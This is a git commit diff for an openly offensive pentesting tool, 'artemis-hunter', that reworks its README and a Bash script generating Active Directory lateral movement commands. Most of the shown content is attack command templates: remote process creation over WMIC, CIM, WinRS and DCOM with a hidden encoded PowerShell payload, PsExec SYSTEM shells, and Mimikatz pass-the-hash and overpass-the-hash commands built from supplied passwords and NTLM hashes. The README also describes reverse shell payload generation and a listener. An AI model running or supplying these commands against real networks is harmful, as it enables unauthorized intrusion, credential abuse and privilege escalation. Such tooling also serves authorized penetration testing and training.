7eadcf38ccf435176ab4e5d8718a8023e54412f0
Nathan Miller <144389222+Komodo-pty@users.noreply.github.com>
2025-08-18 17:00:12 -0700

    Code hygiene

--- README.md
+++ README.md
@@ -1,25 +1,14 @@
 # artemis-hunter
-Artemis helps Pentesters hunt for reverse shells and Active Directory Lateral Movement vectors.
+Hunt for shells with Artemis.
 
-## Functionality
-Artemis generates payloads in various languages for Linux or Windows targets, provides tips for stabilizing the shell, and spawns a listener for you.
+Artemis generates reverse shell payloads &amp; outputs commands for lateral movement in an Active Directory environment.
 
-Artemis will instead output commands for AD Lateral Movement if you use `artemis -a`
+## Table of Contents
 
-If no arguments are specified, Artemis will run in interactive mode. For a list of supported arguments, run `artemis -h`
-
-### Reverse shell Payloads
-[ps] PowerShell
-
-[bash]
-
-[nc] Netcat (*nix targets)
-
-[java]
-
-[py] Python (*nix targets)
-
-[php] (*nix targets)
+- [Setup](#setup)
+- [Functionality](#functionality)
+- [Pivoting](#pivoting)
+- [Related Projects](#related-projects)
 
 ## Setup
 After installing the dependencies, give `artemis.sh` permission to execute & create a symbolic link in your PATH.
@@ -38,7 +27,43 @@ ncat
 pwsh
 (Installation instructions: https://learn.microsoft.com/en-us/powershell/scripting/install/install-ubuntu?view=powershell-7.4)
 
-# Related Projects
+## Functionality
+```
+Artemis will run in interactive mode unless required arguments are supplied.
+
+[Options]
+	-h: Display this help menu
+	-a: Generate commands for pivoting in Active Directory, instead of reverse shell payloads. If used, all other arguments will be ignored
+	-i <IP_ADDRESS>: Your listener's IP Address
+	-p <PORT>: Your listener's port
+	-l: Start a listener using specified interface and port
+	-t <TARGET_OS>: Specify the target OS for Web shell payloads & for stabilization tips [win/nix]
+	-s <PAYLOAD>: Specify the type of Reverse shell to generate
+
+[Payloads]
+	ps: PowerShell
+	bash
+	nc: Netcat (*nix targets)
+	java
+	py: Python (*nix targets)
+	php: (*nix targets)
+	node: Node.js (*nix targets)
+
+[Usage]
+	artemis -i 10.10.144.68 -p 443 -s php -t nix -l
+	artemis -a
+
+[Troubleshooting]
+	If you're having trouble catching a shell, try the following steps-
+
+	1) Double check your firewall settings & verify target's IP Address
+	2) Instead of using a Reverse shell payload, start capturing ICMP packets and use a payload to make the target ping you a few times
+	3) Use common ports for your Reverse shell (e.g. 80 or 443) or try ports that hosts in your target's LAN are using
+```
+
+### Pivoting
+
+## Related Projects
 Check out the rest of the Pentesting Pantheon:
 
 Perform recon to see everything your target is hiding with Argus (https://github.com/Komodo-pty/argus-recon/)
--- ad_LateralMove.sh
+++ ad_LateralMove.sh
@@ -1,133 +1,214 @@
 #!/bin/bash
-line="\n============================================================\n"
+line="============================================================"
+
+user=""
+passwd=""
+method=""
 
 Creds()
 {
-	echo -e "\nEnter the target account's username without the Hostname (e.g. bob):\n"
-	read user
-
-	echo -e "\nEnter the target account's password:\n"
-	read passwd
+  echo -e "\nEnter the target account's username without the Hostname (e.g. bob):\n"
+  read user
+  echo -e "\nEnter the target account's password:\n"
+  read passwd
 }
 
-echo -e "$line\n[!] Tip: When pivoting between hosts in the same subnet, you can often use the target's IP Address & their Hostname interchangeably.\n"
-echo -e "HOWEVER, this isn't always the case (i.e. When using Sysinternals PSExec without passing credentials). If you're having trouble connecting with one of these, try using the other."
+Help()
+{
+cat <<EOF
 
-echo -e "$line\nSelect a technique:\n[1] WMI\n[2] WinRM (WinRS & PS Remoting)\n[3] DCOM\n[4] PSExec (Sysinternals)\n"
-read mode
+[Options]
+	-h: Show this help message
+	-x <METHOD>: Specify the pivoting method
 
-if [ $mode == 1 ]
-then
-	echo -e "\nSpecify the target's IP Address\n"
-	read target
-	Creds
+[Methods]
+	wmi
+	winrm
+	dcom
+	psexec
 
-	echo -e "$line\n[!] Tip: There are 2 methods for RCE using WMI: WMIC & Powershell. WMIC is deprecated, but it may still be enabled for backwards compatibility\n"
-	echo -e "[!] Tip: These test payloads just launch the Calculator App. If they work, it'll output the PID & ReturnValue 0.\n"
-	echo -e "[+] After the test, substitute the calc command for a Reverse shell payload (e.g. \$Command = 'powershell -nop -w hidden -e...)\n$line\nWMIC Test Payload:\n"
+EOF
+exit 0
+}
 
-	echo "wmic /node:$target /user:$user /password:$passwd process call create \"calc\""
+while getopts ":hx:" option; do
+  case $option in
+    h)
+      Help
+      ;;
+    x)
+      method="$OPTARG"
+      ;;
+  esac
+done
 
-	echo -e "$line\nPowershell Test Payload:\n"
+if [[ -z "$method" ]]; then
+  cat <<EOF
+[!] Tip: When pivoting between hosts in the same subnet, you can often use the target's IP Address & their Hostname interchangeably.
+HOWEVER, this isn't always the case (i.e., When using Sysinternals PSExec without passing credentials). If you're having trouble connecting with one of these, try using the other.
 
-	echo "\$username = '$user';"
-	echo "\$password = '$passwd';"
-	echo "\$secureString = ConvertTo-SecureString \$password -AsPlaintext -Force;"
-	echo "\$credential = New-Object System.Management.Automation.PSCredential \$username, \$secureString;"
-	echo "\$Options = New-CimSessionOption -Protocol DCOM"
-	echo "\$Session = New-Cimsession -ComputerName $target -Credential \$credential -SessionOption \$Options"
-	echo "\$Command = 'calc';"
-	echo "Invoke-CimMethod -CimSession \$Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =\$Command};"
-
-elif [ $mode == 2 ]
-then 
-	echo -e "$line\nSpecify the target's Hostname for WinRS or its IP Address for PS Remoting:\n"
-	read target
-	Creds
-
-	echo -e "\nWinRS Test Payload:\n[!] Tip: If this test works, substitute the commands for a Reverse shell payload\n\n"
-
-	echo "winrs -r:$target -u:$user -p:$passwd \"cmd /c hostname & whoami\""
-
-	echo -e "$line\nBasic PS Remoting:\n[!] Tip: Based off of output from New-PSSession, you may need to use a differnt ID number for Enter-PSSession\n\n"
-
-	echo "\$username = '$user';"
-	echo "\$password = '$passwd';"
-	echo "\$secureString = ConvertTo-SecureString \$password -AsPlaintext -Force;"
-	echo "\$credential = New-Object System.Management.Automation.PSCredential \$username, \$secureString;"
-	echo "New-PSSession -ComputerName $target -Credential \$credential"
-	echo "Enter-PSSession 1"
-
-#Is there a way to check for Special Configuration Names for PS Remoting before getting RCE, so you can use that to connect?
-
-elif [ $mode == 3 ]
-then
-	echo -e "\nEnter the target's IP Address:\n"
-	read target
-
-	echo -e "$line\n[!] Tip: This DCOM method requires that your CURRENT user is a Local Admin on the current machine & the target machine\n"
-	echo -e "\n[!] Tip: You must run the following commands inside an Admin Powershell terminal (i.e. R Click & Run as Admin)\n"
-
-	echo "\$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application.1\",\"$target\"))"
-	echo "\$dcom.Document.ActiveView.ExecuteShellCommand(\"powershell\",\$null,\"powershell -nop -w hidden -e ENCODED_PAYLOAD\",\"7\")"
-
-
-elif [ $mode == 4 ]
-then
-
-#Add option to output cmds for Mimikatz & Rubeus for PtH & PtT
-
-	echo -e "\n[!] Tip: PSExec can be uploaded to the target & doesn't need to be installed.\n"
-	echo -e "[!] Tip: If you don't supply credentials, you'll authenticate as the current user. Ergo, you can OPtH or PtT (Kerberos) by combining it with a tool like Mimikatz."
-	echo -e "\nSelect an option:\n[1] Use a Password\n[2] Use an NTLM Hash (OPtH Attack)\n"
-	read opt
-
-	if [ "$opt" == 1 ]
-	then
-		echo -e "\nEnter the target's IP Address:\n"
-		read target
-		echo -e "\nEnter the Domain (e.g.for xample.com, use xample):\n"
-		read dom
-		Creds
-
-		echo -e "$line\nInteractive Session as User:\n"
-		echo ".\\PsExec.exe -accepteula -i \\\\$target -u $dom\\$user -p $passwd powershell"
-
-		echo -e "\nInteractive Session as SYSTEM:\n"
-		echo ".\\PsExec.exe -accepteula -s \\\\$target -u $dom\\$user -p $passwd powershell"
-	
-	elif [ "$opt" == 2 ]
-	then
-		echo -e "\nEnter the target's Hostname for an OPtH Attack (NOT the IP Address):\n"
-		read target
-		echo -e "$line\n[Setup]\n\n1) Launch an Admin Powershell terminal & start Mimikatz\n2) privilege::debug\n"
-		echo -e "\nEnter the target account's username:\n"
-		read user
-		echo -e "\nEnter the Domain name (e.g. xample.com):\n"
-		read dom
-		echo -e "\nEnter the target account's NTLM Hash:\n"
-		read ntlm
-
-		echo -e "$line\n[PtH]\n\nsekurlsa::pth /user:$user /domain:$dom /ntlm:$ntlm /run:powershell\n"
-
-		echo -e "$line\n[OPtH]\nRequest a TGT using the new Powershell session (e.g. authenticate to an SMB Share)\n"
-		echo "net use \\\\$target"
-		echo "klist"
-
-		echo -e "$line\nInteractive Session as User:\n"
-                echo ".\\PsExec.exe -accepteula \\\\$target powershell"
-
-                echo -e "\nInteractive Session as SYSTEM:\n"
-                echo ".\\PsExec.exe -accepteula -s \\\\$target powershell"
-
-	else
-		echo -e "\nYou did not select a valid option\n"
-        	exit
-	fi
-
-else
-	echo -e "\nYou did not select a valid option\n"
-        exit
+Select a method:
+	[1] WMI
+	[2] WinRM (WinRS & PS Remoting)
+	[3] DCOM
+	[4] PSExec (Sysinternals)
+EOF
+  read method
 fi
 
-echo -e "$line"
+case $method in
+  wmi|1)
+    echo -e "\nSpecify the target's IP Address\n"
+    read target
+    Creds
+
+    cat <<EOF
+$line
+
+[!] Tip: There are 2 methods for RCE using WMI: WMIC & Powershell. WMIC is deprecated, but it may still be enabled for backwards compatibility
+
+These test payloads just launch the Calculator App. If they work, it'll output the PID & ReturnValue 0.
+
+After the test, substitute the calc command for a Reverse shell payload (e.g. \$Command = 'powershell -nop -w hidden -e...)
+
+$line
+
+[WMIC PoC]
+
+	wmic /node:$target /user:$user /password:$passwd process call create "calc"
+
+[Powershell PoC]
+
+	\$username = '$user';
+	\$password = '$passwd';
+	\$secureString = ConvertTo-SecureString \$password -AsPlaintext -Force;
+	\$credential = New-Object System.Management.Automation.PSCredential \$username, \$secureString;
+	\$Options = New-CimSessionOption -Protocol DCOM
+	\$Session = New-Cimsession -ComputerName $target -Credential \$credential -SessionOption \$Options
+	\$Command = 'calc';
+	Invoke-CimMethod -CimSession \$Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =\$Command};
+
+$line
+EOF
+    ;;
+  winrm|2)
+    echo -e "Specify the target's Hostname for WinRS or its IP Address for PS Remoting:"
+    read target
+    Creds
+
+	cat <<EOF
+$line
+
+[WinRS PoC]
+
+If this test works, substitute the commands for a Reverse shell payload
+
+	winrs -r:$target -u:$user -p:$passwd "cmd /c hostname & whoami"
+
+[PS Remoting]
+
+[!] Tip: Based off of output from New-PSSession, you may need to use a differnt ID number for Enter-PSSession
+
+	\$username = '$user';
+	\$password = '$passwd';
+	\$secureString = ConvertTo-SecureString \$password -AsPlaintext -Force;
+	\$credential = New-Object System.Management.Automation.PSCredential \$username, \$secureString;
+	New-PSSession -ComputerName $target -Credential \$credential
+	Enter-PSSession 1
+
+$line
+EOF
+#Is there a way to check for Special Configuration Names for PS Remoting before getting RCE, so you can use that to connect?
+    ;;
+  dcom|3)
+    echo -e "\nEnter the target's IP Address:\n"
+    read target
+    cat <<EOF
+$line
+
+This DCOM method requires that your CURRENT user is a Local Admin on the current machine & the target machine
+
+You must run the following commands inside an Admin Powershell terminal (i.e. R Click & Run as Admin)
+
+	\$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","$target"))
+	\$dcom.Document.ActiveView.ExecuteShellCommand("powershell",\$null,"powershell -nop -w hidden -e ENCODED_PAYLOAD","7")
+
+$line
+EOF
+    ;;
+  psexec|4)
+#output cmds for Mimikatz & Rubeus for PtH & PtT
+    cat <<EOF
+$line
+
+PSExec can be uploaded to the target & doesn't need to be installed.
+
+If you don't supply credentials, you'll authenticate as the current user. Ergo, you can OPtH or PtT (Kerberos) by combining it with a tool like Mimikatz.
+
+Select an option:
+	[1] Use a Password
+	[2] Use an NTLM Hash (OPtH Attack)
+EOF
+  read opt
+  if [[ "$opt" == "1" ]]; then
+    echo -e "\nEnter the target's IP Address:\n"
+    read target
+    echo -e "\nEnter the Domain (e.g.for xample.com, use xample):\n"
+    read dom
+    Creds
+
+    cat <<EOF
+$line
+
+[User shell]
+	.\\PsExec.exe -accepteula -i \\\\$target -u $dom\\$user -p $passwd powershell
+
+[SYSTEM shell]
+	.\\PsExec.exe -accepteula -s \\\\$target -u $dom\\$user -p $passwd powershell
+EOF
+
+  elif [[ "$opt" == 2 ]]; then
+    echo -e "\nEnter the target's Hostname for an OPtH Attack (NOT the IP Address):\n"
+    read target
+		
+    echo -e "\nEnter the target account's username:\n"
+    read user
+    echo -e "\nEnter the Domain name (e.g. xample.com):\n"
+    read dom
+    echo -e "\nEnter the target account's NTLM Hash:\n"
+    read ntlm
+
+    cat <<EOF
+$line
+
+[Setup]
+	1) Launch an Admin Powershell terminal & start Mimikatz
+	2) privilege::debug
+
+[PtH]
+	sekurlsa::pth /user:$user /domain:$dom /ntlm:$ntlm /run:powershell
+
+[OPtH]
+
+Request a TGT using the new Powershell session (e.g. authenticate to an SMB Share)
+
+	net use \\\\$target
+	klist
+
+[User shell]
+	.\\PsExec.exe -accepteula \\\\$target powershell
+
+[SYSTEM shell]
+	.\\PsExec.exe -accepteula -s \\\\$target powershell
+
+$line
+EOF
+    else
+      echo -e "\nYou did not select a valid option\n"
+      exit
+    fi
+    ;;
+  *)
+    echo -e "\nYou did not select a valid option\n"
+    Help
+esac
